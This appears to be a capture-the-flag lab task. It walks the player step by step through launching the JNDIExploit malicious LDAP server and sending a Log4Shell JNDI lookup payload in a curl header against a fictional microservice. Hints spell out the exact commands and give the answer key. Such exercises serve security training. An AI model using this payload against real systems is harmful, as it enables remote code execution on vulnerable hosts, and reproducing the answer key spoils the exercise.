# Task 4: Preparing the Way 🔬

## DESCRIPTION

Looks like the attacker has been using JNDIExploit in your environment! That means they were likely trying to exploit log4j. That’s bad news, especially since you know the SudoSingles™ image optimization microservice is written in Java and uses log4j.

You need to figure out if the "sudosingles-optimizer" service is vulnerable to the log4shell exploit. Now.

A quick and efficient way to figure out if you’re vulnerable is to try to do the exploit yourself. (Maybe not the most secure way, though, so don’t try this at home.)

## DETAILS

So, you're going to use JNDIExploit to see if "sudosingles-optimizer" is vulnerable. This challenge has many parts, so go through each one carefully.

If you’re not already aware, JNDIExploit is a tool that sets up a malicious LDAP server that can be used to execute arbitrary commands on a host running an application vulnerable to the log4shell exploit.

TLDR; you’re going to trick "sudosingles-optimizer" into connecting to a malicious server so you can run whatever commands we want inside its container.

You have to set up the server first. To do this, do the following:

1. Open the Terminal Emulator application from the dock on the bottom.
2. Navigate to the hacker folder by running “cd /config/Desktop/hacker”
3. Find your private ip address on the LAN network. There are many ways to find your IP address on Linux – I'll leave this one to you. Just make sure you write it down. The IP you find should look something like 10.0.XX.XX or 10.0.XX.XXX
4. Run the JNDIExploit-1.2-SNAPSHOT.jar file using Java, configuring it to start the malicious server listening on the private IP address you found in step 3 above.

If you see something like the below, you’re on the right track:

[+] LDAP Server Start Listening on 1389... 
[+] HTTP Server Start Listening on 9001... 


To test to make sure it’s running correctly, open another Terminal Emulator window and run the following command, where YOURIP is your local IP: "curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'"

To complete this challenge, after you run the above command, enter the last line generated in the Terminal Emulator window where JNDIExploit is running, and hit “Submit.” If your answer doesn’t submit, double-check all the above steps. It could mean that something is wrong with the server command.

## NOTES

For the answer, enter the whole line, exactly as it appears in your terminal.

The answer will look something like this (fill in the blanks): [+] _______ ______: ___ 

(I know it’s annoying, I just want to be sure you’ve set this up correctly, or things will be even more annoying later.)

## SCORING

String answer:

[+] Response code: 200

## HINTS

### HINT 1

To find your IP address, you can run many commands in the Linux terminal. Maybe there’s some way to use the hostname command to get what you want?

If you’re having trouble with JNDIExploit, maybe try looking at the "-h" flag?

### HINT 2

"hostname -I" will give you your private IP address.

"java –jar JNDIExploit-1.2-SNAPSHOT.jar -i PRIVATEIPADDRESS" will start the server properly.

Triple-check to make sure you’re using that IP address.

The answer is the whole last line from the Terminal Emulator window where you first ran the JNDIExploit program. Punctuation and all.

### HINT 3

1. Open a Terminal Emulator window
2. Run "hostname -I" to get your ip address
3. Run "java –jar JNDIExploit-1.2-SNAPSHOT.jar -i YOURIP"
4. Open another window and run "curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'"
5. If you are successful, you should see a line that looks like the following show up in your original terminal window: "[+] Response code: 200"
